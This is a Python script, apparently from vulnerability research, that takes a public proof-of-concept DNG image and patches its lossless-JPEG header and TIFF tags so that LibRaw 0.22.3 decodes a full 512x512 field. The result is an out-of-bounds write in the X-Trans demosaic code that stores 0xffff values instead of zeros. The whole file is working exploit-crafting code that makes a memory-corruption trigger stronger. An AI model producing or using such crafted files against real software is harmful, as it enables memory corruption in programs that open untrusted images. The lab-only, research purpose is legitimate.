#!/usr/bin/env python3
"""Craft a lab-only nonzero-pixel X-Trans DNG from the pinned public PoC.

The public PoC embeds a 1x1 lossless-JPEG strip (48 bytes) that LibRaw 0.22.3
decodes to a single pixel, leaving the raw field zero and the OOB halfwords
zero. This variant makes the JPEG a 512x512 frame with 20,000 zero scan bytes:
LibRaw decodes a full field of nonzero raw pixels, so the stale-dimension OOB
store at xtrans_demosaic.cpp:427 writes 0xffff halfwords instead of zero.

No network use. Deterministic from the pinned input.
usage: craft_nonzero_poc.py SRC DST
"""
import struct
import sys

src, dst = sys.argv[1:3]
d = bytearray(open(src, "rb").read())
assert len(d) == 263141
assert d[0x1E6:0x1EA] == b"\xff\xc3\x00\x0b"  # SOF3, lossless JPEG

# SOF3 fields are big-endian: precision 12, height 1 -> 512, width 1 -> 512.
struct.pack_into(">H", d, 0x1EB, 512)
struct.pack_into(">H", d, 0x1ED, 512)

n = struct.unpack_from("<H", d, 8)[0]
for i in range(n):
    e = 8 + 2 + 12 * i
    tag = struct.unpack_from("<H", d, e)[0]
    if tag == 0x102:  # TIFF BitsPerSample 8 -> JPEG SOF3 precision 12
        assert struct.unpack_from("<H", d, e + 8)[0] == 8
        struct.pack_into("<H", d, e + 8, 12)
    if tag == 0x117:  # StripByteCounts: original 48 + 20,000 scan bytes
        assert struct.unpack_from("<I", d, e + 8)[0] == 48
        struct.pack_into("<I", d, e + 8, 20048)

# The old strip ends at 532; zero scan bytes follow. This overwrites the
# optional thumbnail region but leaves the CFA pattern at 262144 intact.
assert d[531] == 0  # last original scan byte
for i in range(532, 20532):
    d[i] = 0

open(dst, "wb").write(d)
print(f"wrote {dst} len={len(d)}")
